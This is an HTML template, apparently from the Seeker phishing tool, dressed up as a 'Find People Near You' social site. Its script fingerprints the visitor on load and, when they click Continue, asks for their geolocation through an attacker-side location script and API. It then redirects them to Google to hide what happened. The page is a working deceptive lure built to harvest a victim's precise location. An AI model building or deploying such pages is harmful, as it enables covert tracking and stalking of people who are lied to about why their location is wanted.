<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Near You | Meet New People</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0a0a0a;
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      text-align: center;
      max-width: 400px;
    }
    h1 { font-size: 1.8rem; margin-bottom: 8px; }
    p { color: #aaa; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      padding: 14px 32px;
      background: #4a9eff;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      text-decoration: none;
    }
    .btn:hover { background: #3a8eef; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #888; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Find People Near You</h1>
    <p>Meet new people and make new friends. Click Continue to get started.</p>
    <button id="continueBtn" class="btn" onclick="handleContinue()">Continue</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = '{{ api_base }}';
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleContinue() {
      var btn = document.getElementById('continueBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Requesting...';
      var redirectUrl = '{{ redirect_url }}' || 'https://www.google.com';
      locate(
        function() {
          status.textContent = 'Thank you!';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Unable to get location. ' + (msg || '');
          btn.disabled = false;
          btn.textContent = 'Continue';
        }
      );
    }
  </script>
</body>
</html>
